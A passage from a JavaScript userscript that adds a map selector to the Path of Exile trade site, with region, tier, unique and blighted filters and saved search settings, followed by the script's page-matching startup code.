    mapOfMaps.regions[r.regionId] = {name: r.names.filter(function(x) { return x.language && x.language.code == 'en'; })[0].name, maps: []};
    if (r.regionId >= 0) {
      var div = $(/* html */ `<div class="row">
        <div class="col-4"><label class="btn"><b>${mapOfMaps.regions[r.regionId].name}</b></label></div>
        <div class="col-8">
          <div class="btn-group btn-group-toggle" data-toggle="buttons">
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-none" id="region-${r.regionId}-none" autocomplete="off"> none</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-any" id="region-${r.regionId}-any" autocomplete="off"> any</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-0" id="region-${r.regionId}-0" autocomplete="off"> 0 ws</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-1" id="region-${r.regionId}-1" autocomplete="off"> 1 ws</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-2" id="region-${r.regionId}-2" autocomplete="off"> 2 ws</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-3" id="region-${r.regionId}-3" autocomplete="off"> 3 ws</label>
            <label class="btn btn-light"><input type="radio" name="region-${r.regionId}-4" id="region-${r.regionId}-4" autocomplete="off"> 4 ws</label>
          </div>
        </div>
      </div>`);
      regionsPanel.append(div);
    }
  });
  var div = $(/* html */ `<div class="row">
    <div class="col-4"><label class="btn"><b>Other</b> (guardians)</label></div>
    <div class="col-8">
      <div class="btn-group btn-group-toggle" data-toggle="buttons">
        <label class="btn btn-light"><input type="radio" name="region-other-none" id="region-other-none" autocomplete="off"> none</label>
        <label class="btn btn-light"><input type="radio" name="region-other-any" id="region-other-any" autocomplete="off"> any</label>
      </div>
    </div>
  </div>`);
  regionsPanel.append(div);
  iframe.contents().find('[name^=region-]').on('click', function () {
    var el = $(this);
    iframe.contents().find(`#region-tab`).addClass("gs-checked");
    var arr = el.attr('id').split('-');
    $.each( mapOfMaps.regions, function( key, value ) {
      if (key >= 0) {
        var thisRegion = (arr[1] == 'all') || (Number(arr[1]) == key);
        if (thisRegion) {
          $.each(['none', 'any', '0', '1', '2', '3', '4'], function( i, ws ) {
            var ctrl = iframe.contents().find(`#region-${key}-${ws}`);
            ctrl.prop('checked', arr[2] == ws);
            ctrl.parent().toggleClass('active', arr[2] == ws);
          });
        }
      } else if (arr[1] == 'other' || (arr[1] == 'all' && (arr[2] == 'any' || arr[2] == 'none'))) {
        $.each(['none', 'any'], function( i, ws ) {
          var ctrl = iframe.contents().find(`#region-other-${ws}`);
          ctrl.prop('checked', arr[2] == ws);
          ctrl.parent().toggleClass('active', arr[2] == ws);
        });
      }
    });
    debug("region toggler", el, el.attr('id'));
    recalcMapSelector(iframe);
  });
  $.each( MAPS.maps, function( i, m ) {
    mapOfMaps.maps[m.id] = {name: m.names.filter(function(x) { return x.language && x.language.code == 'en'; })[0].name, tiers: m.tiers, img: m.img, region: m.region};
    mapOfMaps.mapTags[_.kebabCase(mapOfMaps.maps[m.id].name)] = m.id;
    mapOfMaps.regions[m.region].maps.push(m.id);
  });
  if (mapOfMaps.mapTags['caer-blaidd-wolfpacks-den']) mapOfMaps.mapTags['caer-blaidd'] = mapOfMaps.mapTags['caer-blaidd-wolfpacks-den'];

  $.each( app._data.static_.exchangeData.filter(function(x) { return _.startsWith(x.id, "Maps"); }), function( i, data ) {
    $.each( data.entries, function( j, entry ) {
      var arr = entry.id.split('-tier-'), blighted = false, replica = false;
      var tag = arr[0];
      if (_.startsWith(tag, "blighted-")) {
        blighted = true;
        tag = tag.replace("blighted-", "");
      }
      if (_.startsWith(tag, "replica-")) {
        replica = true;
        tag = tag.replace("replica-", "");
      }
      var tier = Number(arr[1]);
      if (isNaN(tier)) {
        tier = 16;
      }
      var id = mapOfMaps.mapTags[tag];
      mapOfMaps.pageMaps[entry.id] = {id: id, tier: tier, tag: tag, pageTag: entry.id, blighted: blighted, unique: data.id == "MapsUnique"};
      if (_.findIndex(mapOfMaps.mapsList, {id: id}) < 0) {
        var name = _.get(mapOfMaps, `maps.${id}.name`, tag);
        mapOfMaps.mapsList.push({tag: tag, id: id, name: name});
        if (!mapOfMaps.maps[id]) {
          mapOfMaps.warning = true;
        }
      }
    });
  });
  $(".typeahead", iframe[0].contentWindow.document).typeahead('destroy');
  $(".typeahead", iframe[0].contentWindow.document).typeahead({
    source: mapOfMaps.mapsList,
    item: '<li class="dropdown-item"><a class="dropdown-item" href="#" role="option"></a></li>',
    autoSelect: false,
    afterSelect: function(selected) {
      var el = $(this), input = _.get(el, '0.$element', null), type = input && input.attr('id').replace('-search', '');
      input.val('');
      debug('Selection: ', el, input, type, selected);
      if (iframe.contents().find(`#${type}-${selected.id}`).length == 0) {
        addLabel(iframe, type, selected);
        labelChanged(iframe, type);
      }
    }
  });

  debug('mapOfMaps', mapOfMaps);

  if (callback) callback();
};

var addLabel = function (iframe, type, map) {
  var badge = $(`<span class="badge badge-light marg-r-5 gs-removable" id="${type}-${map.id}">${map.name}</span>`);
  badge.on('click', function () {
    var el = $(this);
    el.remove();
    labelChanged(iframe, type);
  });
  iframe.contents().find(`#${type}d`).append(badge);
}

var labelChanged = function (iframe, type) {
  iframe.contents().find(`#${type}-tab`).addClass("gs-checked");
  recalcMapSelector(iframe);
};

var recalcMapSelector = function(iframe) {
  debug("recalcMapSelector", iframe);
  $.each( ["region", "exclude", "include"], function( key, value ) {
    mapSearches.tabs[value] = iframe.contents().find(`#${value}-tab`).hasClass("gs-checked");
  });
  $.each( ["minTier", "maxTier"], function( i, value ) {
    var n = Number(iframe.contents().find(`#${value}`).val());
    if (isNaN(n) || iframe.contents().find(`#${value}`).val() == '') {
      iframe.contents().find(`#${value}`).val('');
      delete mapSearches[value];
    } else {
      if (n < 1) {
        iframe.contents().find(`#${value}`).val(1);
        n = 1;
      } else if (n > 16) {
        iframe.contents().find(`#${value}`).val(16);
        n = 16;
      }
      mapSearches[value] = n;
    }
  });
  mapSearches.unique = iframe.contents().find(`#unique`).is(":checked");
  mapSearches.blighted = iframe.contents().find(`#blighted`).is(":checked");
  $.each( ['include', 'exclude'], function( i, type ) {
    mapSearches[type] = [];
    iframe.contents().find(`#${type}d .badge`).each(function( index ) {
      var el = $( this ), id = Number(el.attr('id').replace(type+'-', ''));
      if (!isNaN(id)) mapSearches[type].push(id);
    });
  });
  mapSearches.regions = {};
  iframe.contents().find('[name^=region-]:checked').each(function( index ) {
    var el = $( this ), arr = el.attr('id').split('-'), region = Number(arr[1]), ws = arr[2];
    if (arr[1] == 'other') region = -1;
    debug("checked region", el, arr);
    if (ws != 'any' && !isNaN(region) && mapOfMaps.regions[region]) {
      mapSearches.regions[region] = ws;
    }
  });
  putMapSearches(iframe);
  calcMapList(iframe);
};

var calcMapList = function(iframe) {
  var warning = false;
  mapOfMaps.resultsList = [[], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], [], []];
  $.each( mapOfMaps.pageMaps, function( key, map ) {
    var addMap = true, region = _.get(mapOfMaps, `maps.${map.id}.region`, -1);
    if (map.unique && !mapSearches.unique) addMap = false;
    if (map.blighted && !mapSearches.blighted) addMap = false;
    if (mapSearches.minTier && mapSearches.minTier > map.tier) addMap = false;
    if (mapSearches.maxTier && mapSearches.maxTier < map.tier) addMap = false;
    if (addMap) {
      if (mapSearches.tabs && mapSearches.tabs["region"]) {
        var filterRegion = mapSearches.regions && mapSearches.regions[region]; // -1 none - 0-4 awakening stones - null any
        if (filterRegion == 'none') addMap = false;
        if (filterRegion != 'any' && filterRegion != 'none' && !isNaN(Number(filterRegion)) && mapOfMaps.maps[map.id].tiers[Number(filterRegion)] != map.tier) {
          addMap = false;
          if (DEBUG && !warning && mapOfMaps.maps[map.id].tiers.indexOf(map.tier) < 0) {
            debug("map not in ranges", map, mapOfMaps.maps[map.id].tiers);
            warning = true;
          }
        }
      }
      if (mapSearches.tabs && mapSearches.tabs["include"] && mapSearches.include && mapSearches.include.indexOf(map.id) >= 0) addMap = true;
      if (mapSearches.tabs && mapSearches.tabs["exclude"] && mapSearches.exclude && mapSearches.exclude.indexOf(map.id) >= 0) addMap = false;
    }
    if (addMap) {
      var t = ((map.unique) ? 17 : ((map.blighted) ? 16 : (map.tier - 1)));
      // debug("calcMapList", t, map);
      mapOfMaps.resultsList[t].push(map);
    }

  });

  iframe.contents().find(`#maps-results-qt`).text(_.flatten(mapOfMaps.resultsList).length);
  iframe.contents().find(`#maps-results`).empty();
  if (warning) iframe.contents().find(`#maps-results`).append(`<div class="alert alert-warning" role="alert"><b>Regions map lists seem to be outdated!</b> Check for an update of PTE. Until this is fixed filtering by region/awakening stones will not work properly.</div>`);
  if (mapOfMaps.warning) iframe.contents().find(`#maps-results`).append(`<div class="alert alert-warning" role="alert"><b>Map lists seem to be outdated!</b> Check for an update of PTE. Until this is fixed some map won't be selecable by this tool.</div>`);
  $.each( mapOfMaps.resultsList, function( t, maps ) {
    if (maps.length > 0) {
      var badges = $('<div></div>');
      $.each( maps, function( i, map ) {
        var name = _.get(mapOfMaps, `maps.${map.id}.name`, map.tag);
        var badge = $(`<span class="badge badge-light marg-r-5 gs-badge-with-icon">${name}${((map.unique) ? ' T'+map.tier : '')}</span>`);
        var deselector = $(`<i class="fas fa-ban gs-clickable text-danger"></i>`);
        deselector.on( "click", function() {
          iframe.contents().find(`#exclude-tab`).click();
          addLabel(iframe, 'exclude', {id: map.id, name: name});
          labelChanged(iframe, 'exclude');
        });
        badge.append(deselector);
        badges.append(badge);

      });
      iframe.contents().find(`#maps-results`).append(`<h6>${((t < 16) ? ('TIER ' + (t+1)) : ((t == 16) ? 'BLIGHTED' : ((t == 17) ? 'UNIQUE' : 'OTHER')) ) }</h6>`).append(badges);
    }
  });

};

var applyMapSearches = function(iframe) {
  var type = ((iframe.attr('id').indexOf('offer') === 0) ? 'have' : 'want'), results = _.flatten(mapOfMaps.resultsList);
  $.each( mapOfMaps.pageMaps, function( key, map ) {
    if (_.findIndex(results, {pageTag: map.pageTag}) >= 0) {
      app.$store.commit("setExchangeItem", {
          type: type, id: map.pageTag
      });
    } else {
      app.$store.commit("removeExchangeItem", {
          type: type, id: map.pageTag
      });
    }
  });
  closeFrame(iframe.attr('id'));
};

var loadMapSearches = function(event) {
  var type = event.type.replace(/-frame-open$/, "");
  var iframe = $("#"+type);
  getMapSearches(iframe);
  setSearchControls(iframe);
  calcMapList(iframe);
};

var setSearchControls = function(iframe) {
  $.each( ["region", "exclude", "include"], function( key, value ) {
    iframe.contents().find(`#${value}-tab`).toggleClass("gs-checked", mapSearches.tabs[value] ? true : false);
  });
  if (iframe.contents().find(`#myTab .gs-checked`).length > 0) {
    iframe.contents().find(`#myTab .gs-checked`).first().click();
  }
  $.each( ["minTier", "maxTier"], function( key, value ) {
    iframe.contents().find(`#${value}`).val(((mapSearches[value] != undefined) ? mapSearches[value] : ''));
  });
  $.each( ["unique", "blighted"], function( key, value ) {
    iframe.contents().find(`#${value}`).prop('checked', mapSearches[value]);
  });
  $.each( mapOfMaps.regions, function( key, value ) {
    if (key >= 0) {
      $.each(['none', 'any', '0', '1', '2', '3', '4'], function( i, ws ) {
        var isActiveWs = _.get(mapSearches, `regions.${key}`, 'any') == ws;
        var ctrl = iframe.contents().find(`#region-${key}-${ws}`);
        ctrl.prop('checked', isActiveWs);
        ctrl.parent().toggleClass('active', isActiveWs);
      });
    } else {
      $.each(['none', 'any'], function( i, ws ) {
        var isActiveWs = _.get(mapSearches, `regions.${key}`, 'any') == ws;
        var ctrl = iframe.contents().find(`#region-other-${ws}`);
        ctrl.prop('checked', isActiveWs);
        ctrl.parent().toggleClass('active', isActiveWs);
      });
    }
  });
  $.each( ["include", "exclude"], function( i, type ) {
    $.each( mapSearches[type], function( j, id ) {
      if (iframe.contents().find(`#${type}-${id}`).length == 0) {
        addLabel(iframe, type, {id: id, name: mapOfMaps.maps[id].name});
      }
    });
  });

  debug("loadMapSearches", event, iframe, mapSearches);
};

var resetMapSearches = function(iframe) {
  mapSearches = $.extend({}, defaultMapSearches);
  putMapSearches(iframe);
  setSearchControls(iframe);
  calcMapList(iframe);
};

var getMapSearches = function(iframe) {
  var searches = localStorage.getItem(iframe.attr('id'));
  if (!searches) {
    searches = {};
  } else {
    searches = JSON.parse(searches);
  }
  debug("getMapSearches", iframe.attr('id'), searches, iframe);
  mapSearches = $.extend({}, defaultMapSearches, searches);
};

var putMapSearches = function(iframe) {
  debug("putMapSearches", iframe.attr('id'), mapSearches);
  localStorage.setItem(iframe.attr('id'), JSON.stringify(mapSearches));
};

var mapSelectorContent = /* html */ `
<div class="container">
  <div class="row">
    <div class="col-sm">
      <h5>Map Selector</h5>
      <div id="tier-controls">

      </div>
      <div id="panels">
        <ul class="nav nav-tabs" id="myTab" role="tablist">
          <li class="nav-item">
            <a class="nav-link active gs-check-toggler gs-checked nowrap" id="region-tab" data-toggle="tab" href="#region" role="tab" aria-controls="region" aria-selected="true" onclick="return false;">
              <i class="fas fa-check-square"></i><i class="fas fa-square"></i> By Region
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link gs-check-toggler nowrap" id="exclude-tab" data-toggle="tab" href="#exclude" role="tab" aria-controls="exclude" aria-selected="true" onclick="return false;">
              <i class="fas fa-check-square"></i><i class="fas fa-square"></i> Exclude
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link gs-check-toggler nowrap" id="include-tab" data-toggle="tab" href="#include" role="tab" aria-controls="include" aria-selected="true" onclick="return false;">
              <i class="fas fa-check-square"></i><i class="fas fa-square"></i> Include
            </a>
          </li>
        </ul>

        <!-- Tab panes -->
        <div class="tab-content" id="myTabContent">
          <div class="tab-pane fade show active" id="region" role="tabpanel" aria-labelledby="region-tab">
          </div>
          <div class="tab-pane fade" id="include" role="tabpanel" aria-labelledby="include-tab">
            <div class="container">
              <div class="row">
                <div class="col-md-12">
                  <h5>Type the map name you want to always include</h5>
                  <input type="text" class="form-control typeahead border-primary" name="include-search" id="include-search" placeholder="map name" autocomplete="off" />
                </div>
              </div>
              <div class="row">
                <div class="col-md-12">
                  <div class="gs-finder-results" id ="included">
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="tab-pane fade" id="exclude" role="tabpanel" aria-labelledby="exclude-tab">
            <div class="container">
              <h5>Type the map names to be excluded from search</h5>
              <input type="text" class="form-control typeahead border-primary" name="exclude-search" id="exclude-search" placeholder="map name" autocomplete="off" />
              <div class="gs-finder-results" id ="excluded">
              </div>
            </div>
          </div>
        </div>
      </div>
      <hr>
      <div class="container">
        <div class="row px-1">
          <div class="col-4" id="">
            <div class="nowrap">
              <label for="minTier" class="col-form-label col-form-label-sm">Min tier</label>
              <input type="number" class="form-control form-control-sm map-selector-control col-6 d-inline" id="minTier" min="1" max="16">
            </div>
          </div>
          <div class="col-4" id="">
            <div class="nowrap">
              <label for="maxTier" class="col-form-label col-form-label-sm">Max tier</label>
              <input type="number" class="form-control form-control-sm map-selector-control col-6 d-inline" id="maxTier" min="1" max="16">
            </div>
          </div>
          <div class="col-2" id="">
            <div class="form-group form-check form-control-sm">
              <input type="checkbox" class="form-check-input map-selector-control" id="unique">
              <label class="form-check-label" for="unique">Unique</label>
            </div>
          </div>
          <div class="col-2" id="">
            <div class="form-group form-check form-control-sm">
              <input type="checkbox" class="form-check-input map-selector-control" id="blighted">
              <label class="form-check-label" for="blighted">Blighted</label>
            </div>
          </div>
        </div>
        <div>
          <h5>
            <span class="badge badge-primary"><span id="maps-results-qt" class=""></span> maps filtered</span>
            <button type="button" class="btn btn-primary btn-ok marg-l-5 gs-pull-right">SELECT</button>
            <button type="button" class="btn btn-link btn-reset marg-l-5 gs-pull-right">reset</button>
          </h5>
        </div>
        <div id="maps-results">
        </div>
      </div>
    </div>
  </div>
</div>
`;


  var enhanceItemSearch = function(loc) {
    debug("ITEM SEARCH!");
    initPage(loc, function(){
      debug(app);
      var league = getCurrentLeague();

      getCurrencies(league, function(curr) {
        if (getSetting('useSaveManager')) initSaveManager();
        initMapSelector();
        currencies = curr;
        if (currencies && currencies.map) {
          if (_.has(app.$store.state.transient, "search.active.localId") && app.$store.state.transient.search.active.results.length > 0 && app.$store.state.transient.search.active.results[0].id && app.$store.state.transient.search.active.results[0].id && app.$store.state.transient.search.active.results[0].result.length > 0 && !itemsLoading[app.$store.state.transient.search.active.localId+'-'+app.$store.state.transient.search.active.results[0].id]) {
            warn(`app committed to changes when results for ${app.$store.state.transient.search.active.localId+'-'+app.$store.state.transient.search.active.results[0].id} where already loaded`);
            itemsLoading[app.$store.state.transient.search.active.localId+'-'+app.$store.state.transient.search.active.results[0].id] = true;
            itemsLoaded({payload:{localId:app.$store.state.transient.search.active.localId, id:app.$store.state.transient.search.active.results[0].id}});
          }
        } else {
          debug("Some features are disabled because we've been unable to load Poe.Ninja currency values.")
        }
      });
      waitFor(["app.$store.state.persistent.tab[0]"], function () {
        tabSelected(app.$store.state.persistent.tab);
      });
      if (getSetting('trackContactedOnCurrencySearches')) {
        $(document).on('click', '.slider-middle textarea', function(e) {
          var btn = $(e.target).parents('.row').first().find(".whisper-btn").prev();
          btn.addClass("copied");
          console.log(arguments, btn);
        });
      }
    });
  };

  var matchers = [
    
    { matcher: /^[^\.]*www\.pathofexile\.com\/trade.*$/, callback: enhanceItemSearch } // Item search
  ]

  waitFor([`if (!app.$data.loaded) { throw "app not loaded yet"; }`, "jQuery", "$('.loader:not(:visible)')[0].attributes"], function() {
    jQuery( document ).ready(function() {
      debug("doc ready!");
      $.each( matchers, function( i, m ) {
        if (m.matcher.test(window.location)) {
          if (DELAY > 0) {
            debug(`delay: ${DELAY}`)
            setTimeout(function(){ m.callback(window.location); }, DELAY);
          } else {
            m.callback(window.location);
          }
        }
      });
    });
  });

})();
